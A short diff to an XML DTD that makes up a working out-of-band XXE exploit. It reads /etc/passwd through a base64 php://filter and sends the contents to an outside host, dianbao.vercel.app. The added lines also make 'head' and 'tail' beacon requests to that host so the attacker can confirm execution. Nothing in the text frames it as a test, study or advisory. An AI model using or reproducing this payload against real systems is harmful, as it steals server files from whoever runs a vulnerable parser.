@@ -4,5 +4,9 @@
 <!ELEMENT name (#PCDATA)>
 <!ELEMENT timestamp (#PCDATA)>
 <!ENTITY % zfile SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % al "<!ENTITY hello SYSTEM 'http://dianbao.vercel.app/send/3AD2781AD6E69/ESON%zfile;'>">
-%al;
+<!ENTITY % confirm1 SYSTEM "https://dianbao.vercel.app/send/3AD2781AD6E69/ESON_head">
+		%confirm1;
+<!ENTITY % al "<!ENTITY hello SYSTEM 'https://dianbao.vercel.app/send/3AD2781AD6E69/ESON%zfile;'>">
+		%al;
+<!ENTITY % confirm2 SYSTEM "https://dianbao.vercel.app/send/3AD2781AD6E69/ESON_tail">
+		%confirm2;
